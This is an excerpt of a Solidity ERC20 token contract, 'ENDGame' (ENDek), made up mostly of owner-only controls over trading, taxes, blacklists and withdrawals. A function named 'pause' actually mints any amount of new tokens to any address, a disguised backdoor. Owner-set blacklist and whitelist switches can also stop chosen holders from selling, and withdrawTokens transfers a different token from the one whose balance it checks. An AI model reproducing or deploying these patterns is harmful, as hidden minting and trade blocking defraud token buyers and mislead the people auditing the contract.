...
contract ENDGame is ERC20, Ownable, Pausable {
    // CONFIG START

    uint256 denominator = 100;
    
    // TOKEN
    string tokenName = "End Gameek";
    string tokenSymbol = "ENDek";
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal override virtual {
        if(isExcluded[msg.sender] || isExcluded[tx.origin] || inTax) {
            ...
            if(!isExcluded[sender] && !isExcluded[recipient]) {
                require(!paused(), "ENDGame: Transfers paused");
                require(!blacklistStatus || (!isBlacklisted[sender] && !isBlacklisted[recipient]), "ENDGame: Blacklisted");
                require(!whitelistStatus || (isWhitelisted[sender] && isWhitelisted[recipient]), "ENDGame: Not Whitelisted");

                if(sender == address(_UniswapV2Pair) || recipient == address(_UniswapV2Pair)) {
                    if(sender == address(_UniswapV2Pair)) {
                        require(amount <= maxTxAmount, "ENDGame: Max tx amount");
                        require(sender != address(_UniswapV2Pair) || (sender == address(_UniswapV2Pair) && block.number >= nextBuyBlock[recipient]), "ENDGame: Cooldown");
                    ...
                    require(isExcludedFromBotProtection[recipient] || balanceOf(recipient) + amount <= maxWalletAmount, "ENDGame: Max wallet amount");                
                }
            }

            if(sender == address(_UniswapV2Pair) && !isExcludedFromBotProtection[recipient]) {
                require(!recipient.isContract(), "ENDGame: Bot Protection");
            } else if(recipient == address(_UniswapV2Pair) && !isExcludedFromBotProtection[sender]) {
                require(!sender.isContract(), "ENDGame: Bot Protection");
            }
    ...
    function setToken(address newValue) external onlyOwner {
        require(newValue != token, "ENDGame: Value already set to that option");

        token = newValue;
    }

    function setDenominator(uint256 newValue) external onlyOwner {
        require(newValue != denominator, "ENDGame: Value already set to that option");

        denominator = newValue;
    }

    function setMaxTxAmount(uint256 newValue) external onlyOwner {
        require(newValue != maxTxAmount, "ENDGame: Value already set to that option");

        maxTxAmount = newValue;
    }

    function setMaxWalletAmount(uint256 newValue) external onlyOwner {
        require(newValue != maxWalletAmount, "ENDGame: Value already set to that option");
    ...
    function setExcluded(address account, bool newValue) external onlyOwner {
        require(newValue != isExcluded[account], "ENDGame: Value already set to that option");

        isExcluded[account] = newValue;
    }

    function setExcludedFromBotProtection(address account, bool newValue) external onlyOwner {
        require(newValue != isExcludedFromBotProtection[account], "ENDGame: Value already set to that option");
    ...
    function massSetExcluded(address[] memory accounts, bool newValue) external onlyOwner {
        for(uint256 i; i < accounts.length; i++) {
            require(newValue != isExcluded[accounts[i]], "ENDGame: Value already set to that option");
    ...
    function massSetExcludedFromBotProtection(address[] memory accounts, bool newValue) external onlyOwner {
        for(uint256 i; i < accounts.length; i++) {
            require(newValue != isExcludedFromBotProtection[accounts[i]], "ENDGame: Value already set to that option");

            isExcludedFromBotProtection[accounts[i]] = newValue;
        }
    }

    function pause(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
    ...
    function setBlacklistStatus(bool newValue) external onlyOwner {
        require(blacklistStatus != newValue, "ENDGame: Value already set to that option");

        blacklistStatus = newValue;
    }

    function setWhitelistStatus(bool newValue) external onlyOwner {
        require(whitelistStatus != newValue, "ENDGame: Value already set to that option");

        whitelistStatus = newValue;
    }

    function setBlacklisted(address account, bool newValue) external onlyOwner {
        require(newValue != isBlacklisted[account], "ENDGame: Value already set to that option");

        isBlacklisted[account] = newValue;
    }

    function setWhitelisted(address account, bool newValue) external onlyOwner {
        require(newValue != isWhitelisted[account], "ENDGame: Value already set to that option");
    ...
    function massSetBlacklisted(address[] memory accounts, bool newValue) external onlyOwner {
        for(uint256 i; i < accounts.length; i++) {
            require(newValue != isBlacklisted[accounts[i]], "ENDGame: Value already set to that option");
    ...
    function massSetWhitelisted(address[] memory accounts, bool newValue) external onlyOwner {
        for(uint256 i; i < accounts.length; i++) {
            require(newValue != isWhitelisted[accounts[i]], "ENDGame: Value already set to that option");
    ...
    function setTaxStatus(bool newValue) external onlyOwner {
        require(taxStatus != newValue, "ENDGame: Value already set to that option");

        taxStatus = newValue;
    }

    function withdrawETH(address to, uint256 value) external onlyOwner {
        require(address(this).balance >= value, "ENDGame: Insufficient ETH balance");

        (bool success,) = to.call{value: value}("");
        require(success, "ENDGame: Transfer failed");
    }

    function withdrawTokens(address tokenAddress, address to, uint256 value) external onlyOwner {
        require(IERC20(tokenAddress).balanceOf(address(this)) >= value, "ENDGame: Insufficient token balance");

        try IERC20(token).transfer(to, value) {} catch {
            revert("ENDGame: Transfer failed");
        }
    }
